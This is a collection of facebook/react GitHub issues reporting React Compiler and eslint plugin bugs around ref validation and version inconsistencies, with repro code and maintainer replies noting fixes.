{"repo": "facebook/react", "issue_number": 34018, "issue_url": "https://github.com/facebook/react/issues/34018", "issue_title": "[Compiler Bug]: Inconsistent errors between React Compiler Playground and latest experimental npm package", "issue_author": "laug", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://github.com/laug/test-react-compiler-errors\n\n### Repro steps\n\nIdentical source code produces an error using the latest experimental npm package, but produces no error in the playground, nor when using a locally built package from the current main branch of the repo.\n\n1) **Npm package** experimental version used: [0.0.0-experimental-2db0664-20250725](https://www.npmjs.com/package/eslint-plugin-react-compiler/v/0.0.0-experimental-2db0664-20250725) (**has error**)\n2) **Playground** link: [link](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAHQHYIB4AcIwAuABACYIBmAhlADYkVQZyECWEGxAgrrgBQBKYsEzFiMBIVic+osQB4AKgjCEASgiosAwhAC2uVrQQwACjAi5iegJ64LuALwByABYJatCM+IB6AHxyApgAvpiYjMxsHMSQeggAYkws7Bh8GFTxyLGEMKwYAOZCIpzEcByQxgB0XgXpmQgCANxyElIwnMBl0BiE2QAsxCEtGGEYmDj4RMSRKTHKqhpahLoGRibmlrKlXbb2lkPZu3YO2ap5hUOYxeGlvr7EyfrxvcSErqxgxLT5CG8QxAAbiZWBQbG93MRcLQqDYChYmKQyBAVOIEFMSD9evkCsQTBYYGBkHJ7tYTpYqlRiI5iABGPwPACiMAJ2XenyBVFoUD+cCoGAwEBIACM-noIKRQawEKRbmJyhhVMRXPzSMYYNTiIJqf5hHJ5RUSBIwHQSDS4olktE0nsHM0GVCqGAvu8-vtcHKxA69FBCFRCH9XWiTfR9cHTVVykwzXSRl6HVRhRBgd9fmUaGBUVi2Jd8QRvhA+Z5wQB3VjvYgABiq1crAFpJiCXn7aHWAEykYWVgBs3f67crbYArJWAOzD4jC33EQV4ln5-JQmFwhEYWWlYaetrSYjyKeEQgxDjaH5wADWjmAKrX6pC-hhoto8l8+8PGH8IzGIBCQA) (**no error**)\n3) Commit used for **local build**: [cc01584](https://github.com/facebook/react/tree/cc015840ef72d48de86778785894c7ca44f4f856) (**no error**)\n\n**Actual Result:**\nIn case (1) we get an error when mutating the result returned by a function that took a prop as parameter.\nIn cases (2) and (3), we get no error. This issue NOT about whether there should or should not be an error in that case (though that is admittedly a more interesting question!), I am merely reporting the fact it is not consistent.\n\nScreenshot with the error, though you can easily reproduce using the sample [repository](https://github.com/laug/test-react-compiler-errors) provided above:\n<img width=\"969\" height=\"944\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5eafe81a-f1bc-4444-8410-dc8348d047bf\" />\n\nNote that you can check that the absence of error is not due to eslint or the plugin malfunctioning, by uncommenting the line `myprop.a = 1` which produces an error in all 3 cases.\n\n**Expected Result**\nErrors should be the same in the latest experimental package, the playground, and when building from source from current main branch (after accounting for time lag necessary for publishing a new version; I have checked with an older version of the main branch and don't see any error though, which means this discrepancy is not due to a recent change in the code).\n\nAlso it would be nice if there was a way to check which version (commit hash) is currently running in the playground, and which version (commit hash) is contained in the nightly package. (Although the nightly package name contains \"2db0664\", [GitHub cannot find any commit by that hash](https://github.com/facebook/react/tree/2db0664).)\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n0.0.0-experimental-2db0664-20250725", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Thanks for posting, this is definitely weird. This issue is fixed on main so i think it has something to do with when the release got pushed."}, {"author": "poteto", "body": "@laug thanks for reporting. Could you confirm if you still see the same issue using `eslint-plugin-react-hooks@0.0.0-experimental-19baee81-20250725` instead?"}, {"author": "laug", "body": "Thanks for looking into this.\nWith `eslint-plugin-react-`**`hooks`**`@0.0.0-experimental-19baee81-20250725` I get the exact opposite problem: it doesn't report any \"compiler\" errors (e.g. mutating a prop), just the usual hooks errors (e.g. missing useEffect dependency).\n\nI've published a new branch to demonstrate, and added a different line of code where I blatantly mutate a prop (obviously an error) to show this new inconsistency:\n- [Playground link](https://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEwBUYCAogGaUJyEC+BlMEGBAOiDAgIZ2cBudgDsRCAB458BACYJKPKABtClKMLpoIwggEEsWABQBKIiIIFueWDsPmLBADwAVBGDwAlXnQDCrLGhKCDAACixYBBgAnljhALwA5AAWCEpKEAkEWMGQwnHAxMI8GAjIBAkAUhBJwpn0jAD0AHz2xiL0IiJ4MQgEITnaBHFmOgRFJWXuMGjCAOZCwh2iwmoaeFo6kCUAYuqa2objpQRTM7OmwPZw2pBBAHTps4fFCMYLFlY2RATX6nhlABYCPQFksxJJcKo9utBq53F4+Hg-NhAsEwhAjPZiNFYhiADRZAY6ehlbExcKTPDTOYE7IwXJlfr0wZLC6dUYNBo-FJwADWBDwSR4hG4iIAtEkIBBeWACGhZTB1MIzmU0IRrjBuHQlFFLAgpHhZYLehh5WAzrJ9QhhHINFF7KQKNRaHhDCYhk0Rg4fjcIPdHoYceE3vZ6ASANoAXVMnIICLoBAAElL+Y6qDQE0LZTxImaLXJsjbrXAomUEkGMQl2RZY3AefzBcK9eLJdKFfrIbKAEY8c1wH0ooIwAjBFj01WEGQQNwEAByAHlnMh7HTcncjkNygBZNC8hCZWMSbJ0BAyMrkTW4MqC+UEABuPCUUF6cB4wmEEEIXZNEBkaEoaCnvYsZeGAyj-AQPBdhAd69EoMy9LeGpangOp6gap6QdmOijrgco6MaWRKDwUSzCw6gyASXZQIQt4Ls46GQphvaQThl7DqQFqcG48HCHgYpYE+swzGKop0BKKZgAAAgADHcckyWKR7BJg1p4I+YoAIwAJw9ggCAAByaWKABMMkmQArDJADslmcNWPrCO4BBCjaQ6bu6cSepcowWNcTkim44GblsCC7GsGyBuSGJvAQsZYL2RopFk4QOTWXIYDRwq9IR3BgSo9gfEFKh3L8fGbpp7wOLGUEwXBCE-IoZCyrx6xzCO7EEOkr5pLqADuapJBwIA8TM-GCVAwnCKJ3j8dcg7BLJ8nyUpkgqSUfEaSZMhdjJABse0AqZ5lWbZFmcAQ1GEB+HVjvhREkWR0A2qGCz2J8MA6I4V14IM2g+PBfL5K5MhDvQTTEd+SiOA0P3aE0oIiCA9BAA): as expected, `person.name = 'Mike'` is correctly reported as an `Error: This value cannot be modified`\n- [Test repo](https://github.com/laug/test-react-compiler-errors/tree/using-hooks-plugin-instead) using `eslint-plugin-react-hooks@0.0.0-experimental-19baee81-20250725`: the line `person.name = 'Mike'` is not flagged as an error even though it should. (The `result.count` line of my original report is obviously not getting flagged either, which is technically correct, but it seems the compiler checks are not running at all.)\n\nJust to be sure it isn't eslint or the plugin malfunctioning and not running at all, I added a useEffect with a missing dependency, which does get flagged correctly.\n\nThe minimal repro is in this branch: [using-hooks-plugin-instead](https://github.com/laug/test-react-compiler-errors/tree/using-hooks-plugin-instead) so please feel free to check if I'm doing something wrong.\n\n<img width=\"1073\" height=\"775\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a73c95d7-4235-4946-84b2-236dbbb52296\" />"}, {"author": "poteto", "body": "@laug oh sorry, I should have gave you a heads up: the compiler rule in eslint-plugin-react-hooks isn't enabled by default yet (we're working on cleaning up some errors before we do). So you'll need to enable it explicitly following by adding `'react-hooks/react-compiler': 'error',` to your [eslint config](https://react.dev/learn/react-compiler/installation#eslint-integration)"}, {"author": "laug", "body": "Ah I see, it's working now!\n\nI do not see the original issue with the hooks plugin, i.e. it doesn't flag the `result.count` line as an error.\n\nSo it seems the issue is only present on the eslint-plugin-react-compiler package."}, {"author": "laug", "body": "Using `eslint-plugin-react-compiler@0.0.0-experimental-4e25a2e-20250728` I am no longer experiencing the issue.\n\nI can still reproduce it with `0.0.0-experimental-2db0664-20250725` and earlier versions.\n\nI guess this was just fixed very recently and the 20250725 package was built before the fix was in. When I found the discrepancy with the playground I didn't realize it was related to such a recent change.\n\nSorry for the false alarm."}, {"author": "josephsavona", "body": "Thanks for following up!"}]}
{"repo": "facebook/react", "issue_number": 32320, "issue_url": "https://github.com/facebook/react/issues/32320", "issue_title": "[Compiler Bug]: InvalidReact: Ref values (the `current` property) may not be accessed during render. False Positive", "issue_author": "funktr0n", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAHQHYIB4AcIwAuABACYIBmAhlADYkVQZyECWEGxAsgJ4CCuXAAoAlMWCZixOBzAlSrAG4AlSsQC8xKGASqKQjHVoiA3JOmySAWx4AJKhlK0EMDcQQaAfOPNSqzoiEFFUoAOjhYGAQMQlDWDCwYABUcQlNzAF9zGQw5Ygc4AAsCAAUYCFwwN2AMs0585mKYMoqwUI4AYVpWOABrN1EvYht7RwDROsxzKMJYTiFfYgAeT0WpJeDiKIp1YGC9DM9bBFpaCGIAdQJaUiWAemDV+ql1qnFQj4KmlsrDi8KqPIIAgqoRCh5NmAqDwAPz3KhPF7LO6I4jpDBZDAgDJAA\n\n### Repro steps\n\n1) Create a ref with `useRef()`\n2) Create an event handler that accesses `ref.current`\n3) Create an arbitrary object\n4) Assign an arbitrary property to that object and set it equal to a function that calls the handler from step 2.\n5) Witness the `InvalidReact: Ref values (the `current` property) may not be accessed during render.` error\n\nEx (also in playground link):\n\n```js\nexport default function MyApp() {\n  const divRef = useRef(null);\n  const myHandler = e => {\n    alert(divRef.current.innerText);\n  }\n  const anchorProps = {};\n  anchorProps.onClick = () => myHandler();\n\n\n  return (\n    <>\n      <div ref={divRef}>Hello World</div>\n      <a {...anchorProps}>What does the div say?</a>\n    </>\n  );\n}\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n18.3.1\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-27714ef-20250124", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "sushanthi1813", "body": "You can keep an eye on the [React Compiler release notes](https://react.dev/reference/react/useRef) for updates regarding this issue."}, {"author": "funktr0n", "body": "> You can keep an eye on the [React Compiler release notes](https://react.dev/reference/react/useRef) for updates regarding this issue.\n\n@sushanthi1813 I'm not seeing any release notes at that link"}, {"author": "mofeiZ", "body": "Thanks for the report! We've been working on reducing false positives from `ref.current` validation but this one seems to have slipped by."}, {"author": "dinge321", "body": "For what ive seen in the documentation the problem is because it doesnt consider the possibility that you can add an *onClick* property later in the code, which make react think its another property that *cannot* use the current method of a ref, ill lok at it, post the answer if i find the problem causing it to false positive that "}, {"author": "dinge321", "body": " okay, i think i found it, well in the declaration of the function validateNoRefAccessInRenderImpl on react/compliler/packages/babel-plugin-react-compiler/src/Validation/ValidateNoRefAccesInRender.ts we have cases and each case is treated differently, for example, the ObjectMethod dont call any problems, but the problem is, when you call anchorProps.onClick = () => myHandler(); is not calling the ObjectMethod case, but is calling the PropertyStore case, which triggers by basically anything that stores a new property, the problem is this case also includes ComputedStore which is something like this myObject[\"age\"] = 30; which could be interpreted as we are calling the current property in render lets say for example  myObject[\"age\"] = divRef and that could get that error, but as im new to this community i call @mofeiZ to take a look at this and tell me if im right \n"}, {"author": "josephsavona", "body": "Fix landed in #34026 - thanks again for reporting!"}]}
{"repo": "facebook/react", "issue_number": 31418, "issue_url": "https://github.com/facebook/react/issues/31418", "issue_title": "[Compiler Bug]: Does not check for ref access in useState initial value function", "issue_author": "aeharding", "issue_body": "### What kind of issue is this?\n\n- [X] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAKgmDgBQCURwAOsUXIRUTgIYBGASgmkQC8RKGAR80NRkRFiAypxwJKNIQD523CQDo4sGAkw5qAbkYBfEOaA\n\n### Repro steps\n\nThe playground compiles, but it should fail (Rules of React)\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nlatest playground\n\n### What version of React Compiler are you using?\n\nlatest playground", "issue_labels": ["Type: Bug", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "josephsavona", "body": "Thanks for posting! Fix is up at #34025 "}, {"author": "josephsavona", "body": "Fix landed!"}]}
{"repo": "facebook/react", "issue_number": 33223, "issue_url": "https://github.com/facebook/react/issues/33223", "issue_title": "[Compiler]: Suppressing ref validation errors makes it unclear why code accessing refs is unmemoized", "issue_author": "jonbri", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://stackblitz.com/edit/react-2u9hf3xf-vppqfxt7?file=src%2FTest.tsx,src%2FApp.tsx&terminal=dev\n\n### Repro steps\n\nSteps to reproduce:\n- Open linked stackblitz\n- Click \"Open preview in new tab\"\n- Open browser console\n- Observe console statement (\"_render_\") continuously printing, indicating an infinite rendering loop\n\nRunning the compiler on the following component will not optimize the `o` variable, even though `o` is passed as a dependency to the `useEffect`, thus leading to an infinite rendering loop:\n```tsx\nconst Test = () => {\n  const [, setState] = useState([]);\n  // this should be memoized as it's passed as a dependency to the effect\n  const o = {};\n  useEffect(() => {\n    setState([]);\n  }, [o]);\n  console.log('render');\n  const myRef = useRef(1);\n  return <div>{`${myRef.current}`}</div>;\n};\n```\n\nThe non-minified compiler output (`dist/assets/index-hash.js`) shows the lack of optimization:\n```js\nconst Test = () => {\n  const [, setState] = reactExports.useState([]);\n  const o = {};\n  reactExports.useEffect(() => {\n    setState([]);\n  }, [o]);\n  console.log(\"render\");\n  const myRef = reactExports.useRef(1);\n  return /* @__PURE__ */ jsxRuntimeExports.jsx(\"div\", { children: `${myRef.current}` });\n};\n```\n\nHowever, if the last line is replace with something not affected by the ref (such as `return 'here';`) the optimization does occur:\n```js\nconst Test = () => {\n  const $ = compilerRuntimeExports.c(6);\n  let t0;\n  if ($[0] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t0 = [];\n    $[0] = t0;\n  } else {\n    t0 = $[0];\n  }\n  const [, setState] = reactExports.useState(t0);\n  let t1;\n  if ($[1] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t1 = {};\n    $[1] = t1;\n  } else {\n    t1 = $[1];\n  }\n  const o = t1;\n  let t2;\n  if ($[2] !== setState) {\n    t2 = () => {\n      setState([]);\n    };\n    $[2] = setState;\n    $[3] = t2;\n  } else {\n    t2 = $[3];\n  }\n  let t3;\n  if ($[4] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t3 = [o];\n    $[4] = t3;\n  } else {\n    t3 = $[4];\n  }\n  reactExports.useEffect(t2, t3);\n  console.log(\"render\");\n  let t4;\n  if ($[5] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t4 = /* @__PURE__ */ jsxRuntimeExports.jsx(\"div\", { children: \"here\" });\n    $[5] = t4;\n  } else {\n    t4 = $[5];\n  }\n  return t4;\n};\n```\n\nThis can be replicated by starting starting a project with `yarn create vite`, installing `babel-plugin-react-compiler` and updating `vite.config.ts`:\n```ts\nimport { defineConfig } from \"vite\";\nimport react from \"@vitejs/plugin-react\";\n\nexport default defineConfig({\n  plugins: [\n    react({\n      babel: {\n        plugins: [[\"babel-plugin-react-compiler\", {}]],\n      },\n    }),\n  ],\n  build: {\n    minify: false,\n  },\n});\n```\n\nVersions:\n```\n  \"dependencies\": {\n    \"react\": \"^19.1.0\",\n    \"react-dom\": \"^19.1.0\"\n  },\n  \"devDependencies\": {\n    \"@eslint/js\": \"^9.25.0\",\n    \"@types/react\": \"^19.1.2\",\n    \"@types/react-dom\": \"^19.1.2\",\n    \"@vitejs/plugin-react\": \"^4.4.1\",\n    \"babel-plugin-react-compiler\": \"^19.1.0-rc.1\",\n    \"eslint\": \"^9.25.0\",\n    \"eslint-plugin-react-hooks\": \"^6.0.0-rc.1\",\n    \"eslint-plugin-react-refresh\": \"^0.4.19\",\n    \"globals\": \"^16.0.0\",\n    \"typescript\": \"~5.8.3\",\n    \"typescript-eslint\": \"^8.30.1\",\n    \"vite\": \"^6.3.5\"\n  }\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.1", "issue_labels": ["Type: Bug", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. What's happening here is that your code accesses a ref during render, which is an anti-pattern in React and unsupported by the compiler (it allows breaking memoization which leads to unexpected behavior). We have detection of this pattern but because of some false positives we don't currently flag this in the linter.\n\ncc @poteto and @mvitousek we need to figure this out"}, {"author": "josephsavona", "body": "We're close to fixing up the ref validation and will be enabling it, which will address the issue here. Note that setting state synchronously in an effect is also an anti-pattern, and we have a separate validation rule for this which is now on by default."}, {"author": "josephsavona", "body": "We've fixed up our ref validation and enabled this feature by default, so it should all line up now."}]}
{"repo": "facebook/react", "issue_number": 33209, "issue_url": "https://github.com/facebook/react/issues/33209", "issue_title": "[Compiler]: flags mutations of shared mutable refs and skips optimizations", "issue_author": "szhsin", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEwBcMCAhnggMIQB2VAHngDQFRgIBKCAZmxxr0mhAL4FeMCBgIAdEGXJw88gNyy6GuPTCFaUBghg9etQ8wIBeEoqpmRACgCU6zXW11dBAGIQIVgmcrAD4iDQISHUJtAypjPgDBewRmB31DeNNhFLwXDXCCMjxYOkCCiIAeACMoPDx6coiCemoAGzQ4AGtLYCDLUOBGpoI0XkCYjJMnSNijEwA6OFgyBgIAamsARldhiNFRRuChggBBABMzxoqAehq6+iPSgjy6UVcNFJx8SM9CE6wsAE+gMCtdrgQAMoAC3IZDObAwtXIVVaCAIdHoAFoAKoASQIADdyK0oAhQeCIfU4SNSuRCgl6gRyASIGgzgQ8DA0ABzblGemYlZnIxoOjcggAdyhCFKeGlhOJpJIMLFCDABQ8XgmcRMiU4JgcAAYXgUiiUyk9KukdXxksx5gAFKQEtn8okkhA9bVzPiiR67AgVXz+a7+3ZBvwEUPHCMhsOVa7Wn1Zcx4R3O10wMMvN4aECiIA\n\n### Repro steps\n\nSometimes you need a shared, mutable value that isn\u2019t tied to the UI but is used across multiple components. In these cases, you don\u2019t want React to trigger re-renders when the value changes. To handle this, you can store the value in a ref and pass it down through context.\n\nHowever, when a child component mutates this value (for example, inside an event handler), the compiler currently produces an error and causes optimizations to be skipped. I feel this is too restricted for what is otherwise a legitimate React pattern.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.1", "issue_labels": ["Type: Bug", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. This is occurring because we are currently very conservative about what we assume is a ref. I think the correct thing is to treat identifiers which look like refs as if they were refs (`ref` or `-Ref` suffix). We have a compiler flag for this that we should turn on."}, {"author": "josephsavona", "body": "https://github.com/facebook/react/pull/34005 enables the flag to treat ref-like identifiers as refs by default. As long as your variable is named ref or ends in Ref (myRef etc), the compiler will treat it as a ref. Thanks again for posting!"}]}
{"repo": "facebook/react", "issue_number": 31742, "issue_url": "https://github.com/facebook/react/issues/31742", "issue_title": "[Compiler Bug]: Ref values may not be accessed during render when using `mergeRefs`", "issue_author": "NeilTheFisher", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [X] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wAoAlPmAAdNvhgJcsNgB5CTAG4A+ABIJKlCPgDqOSoTkB6RaoDc4gL7jxx4-lxkA1gjYkYEALb4AFrlxMMGR7AHMmXF8oACMAOjhvYwB3CAArXARnLzJU4y8EGFCEAFopEjBjaO1ovLImOmMweGN64nRY3DBxWgZmVnx8woQAJVIwOQAVFX5xfHxYhfrMKFxR8uR8flGyRli1yZV8AB98emISeoRCQQBtAF1xQQ3t3f2p4-wX3D3SAGEyLTRHbOA4iWb4BJ0MA0JjUApXACSdGWqzG+AAvPglis1mBYhc4TB+AAhCAQSgIMh0QSWOjgpgkTYEjJSQhIlG42IUuihSL4OSYgCMwjEEjmkOh+AuMGhawxUthLMRyJxYxuAAY7rTwXMpDIYO4mDLUYyjic6FRKLS5jY6RI9bIpfRGCw2IMioRcfwyiKdVKcJsJQRsSb8BBGcz4WyVSawL6xXMsYz+LhOJgEOGsTG5ejc-gAOQ9F2sfPxxPlrMc0je0g0v02-CaMAIJObENrMsVub8dukfBkMCfSm7dgrMhVEakADy0VSCEYkw+Fq0KkE8VgUjoBExZWtFdt5YP+CstNt3WdfTY7AKRTWv282Doblw+hgznqoX4wEkfasG2-ZTPMO3z7GoEzsAAMgAIsoACiFL5FuhxWJ2QZEMoOanM2az8MulB1nacz2PgmADmAH6OL4LZlIOKRvoO0ScPgSQwGQfAUZECA+PU-ZOr0rrgg6Br8mYP4kOiwDupO5Svu+PL8EIGKHDcZQADToUoax3IIVgqGUjgINCJhmCop62HQRaXgMN7SWAskfgcMwSEUsYbIp6KHFswE-CQoInGcpCXNc9yPGC9rSI6UlegssQuV6ggEWeFkXq6HA2XeD6sM+xKeK4dBfmJx7-mJQE7CBpByGBkEwUo8Fcc+yGoawkpmJhUDYdWeEEeCxGYJ4E4+FRUiCRFwkKMoYkSVFYw1iQ6mtbWun6RkRmmMopnWOIIBWEAA\n\n### Repro steps\n\nI was previously getting an error saying, \"Ref values (the current property) may not be accessed during render.\" However, passing a function to access the refs seems to work as a solution since there is no eslint error now.\r\n\r\nIn the repro, wrapping the refs in a function return doesn't change any functionality so I'm finding this issue to be a little odd.\r\n\r\nThe error doesn't always appear with every component. I couldn't find a reason why.\r\n\r\nThis seems to be similar to https://github.com/facebook/react/issues/31290\n\n### How often does this bug happen?\n\nSometimes\n\n### What version of React are you using?\n\n19.0.0\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-37ed2a7-20241206", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "aeharding", "body": "Workaround: https://mantine.dev/hooks/use-merged-ref/\r\n\r\nhttps://github.com/reactwg/react-compiler/discussions/31"}, {"author": "josephsavona", "body": "See #34004 which adds support for the merge refs pattern. If a function call takes refs as arguments we normally error. However, if we can infer that result of the function is also a ref \u2014 named `ref` or `-Ref`, or passed as a `ref` prop \u2014 then we allow the call."}, {"author": "josephsavona", "body": "Fix landed!"}]}
{"repo": "facebook/react", "issue_number": 31470, "issue_url": "https://github.com/facebook/react/issues/31470", "issue_title": "[Compiler Bug]: \"Mutating a value returned from 'useContext()', which should not be mutated\" When the value is a Ref", "issue_author": "jay-herrera", "issue_body": "### What kind of issue is this?\n\n- [X] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [X] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAjggDswCBZATwGETcMCBeQmBAQ3tuPvVwApgAHWKCebALaYANggBKCAGbJ8wOLFbdlxKFKkBfYXoCUw4Rmx58AE0VsdBBVGJxcASxL4ACmw25akkgRuPiMVYXxCEjJ8DAlpOUV8ZigwBIU+AHIAOQgMkxFiCNZcWEK+cIj8AB4APgrK6qouHlwAOk8YCAA3VxsYfC62KSgERmBgWMkZeQU9PTrChsqq6gALVykrf2xiIIIAegWl6v2mugZ2zp6+o+XDiqMAbkNTYkdnNw81ja2IAN3gqEhIsiKQCMAYug4tNEnokvgUghmgw+GduAx8hVEQBRBQKBAuPghJI1MKLCKTeIzVpqGC+eEZACaCDAGQqegANPgANqUmEKAC6+QiFWKpWqVlcXXuxAMxBAeiAA\n\n### Repro steps\n\n1. Instantiate a Context\r\n2. In Parent, Instantiate a ref\r\n3. Wrap the child in the Context's Provider, and pass the ref as a value\r\n4. Get the ref in the child, and mutate it in a useEffect\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n18.3.1\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-63b359f-20241101", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "jay-herrera", "body": "Also applies to Event Handlers:\r\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAjggDswCBZATwGETcMCBeQmBAQ3tuPvVwApgAHWKCebALaYANggBKCAGbJ8wOLFbdlxKFKkBfYXoCUw4Rmx58AE0VsdBBVGJxcASxL4ACmw25akkgRuPiMVYXxCEjJ8DAlpOUV8ZigwBIU+AHIAOQgMkxFiCNZcWEK+cIj8AB4APgrK6qouHlwAOk8YCAA3VxsYfC62KSgERmBgWMkZeQU9PTrChsqq6gALVykrf2xiIIIAegWl6v2mugZ2zp6+o+XDiqMAbkNTYkdnNw81ja2IAN3gqEhIsiKQCMAYug4tNEnokvgUghmgw+GduAx8hViqVqlZXF18CRqFJXHAANZjEJJGphRYRSbxGatNQwXzwjIATQQYAyFTm+HuxAMxBAeiAA"}, {"author": "Vansh16aug", "body": "I see , i would like to work on it"}, {"author": "jay-herrera", "body": "@Vansh16aug Hey! any updates?\n\n"}, {"author": "salomonme", "body": "Hey! any updates?"}, {"author": "josephsavona", "body": "#34005 enables the flag to treat ref-like identifiers as refs by default. As long as your variable is named `ref` or ends in `Ref` (`myRef` etc), the compiler will treat it as a ref. Thanks again for posting!"}]}
{"repo": "facebook/react", "issue_number": 33208, "issue_url": "https://github.com/facebook/react/issues/33208", "issue_title": "[Compiler]: passing `ref` to render prop will void optimization", "issue_author": "szhsin", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAejQAgDIEsBGMAhjAJ6ZwQC2ADhAHYL0AuYmVR5jCAJpsxEwIAHnTAJMAAxgIAZpP6DK9MFCoIYbAG64imGfR4bMNGBBpgAOvWVhmmAGIRBAXkwAKYBQAWuADY8BpgAvgCUmC4AfJjA1pgUDHb6chGYUOIASnLu9FB+fqEA3NZxmBiYAApEYGC49ADmybKKmN7OANaYuGxE+RAA7ryltvb4JKnpCABCJJ5NIUUl9PHlVTV1jTLNAsmGxqbmXWwAcgDyACqYvX4DQ8vJzLDLADw8uFqRwHC+AQZzWwtgs80G8PsV6MFwdYRpgAII0GipdzhKIxUoyR4wF5OCCff4pMIRaLPOo0KD2LYuYBbYJlSJAtA4yLgyHWEDBIA\n\n### Repro steps\n\nIn some use cases, especially in library code, it is necessary to pass a `ref` to the consumer using render props. However, this currently results in an error and causes optimizations to be skipped.\n\nExample:\n```jsx\n// `renderChildren` is a render prop; passing `ref` like this is not allowed\nreturn <div>{renderChildren({ ref })}</div>;\n```\n\nIn contrast, passing `ref` to hooks or JSX elements within render has no issues:\n```jsx\nconst bar = useBar({ ref });\n<input ref={ref} />\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.0\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.1", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "josephsavona", "body": "Thanks for reporting! Fixed in #34006"}]}
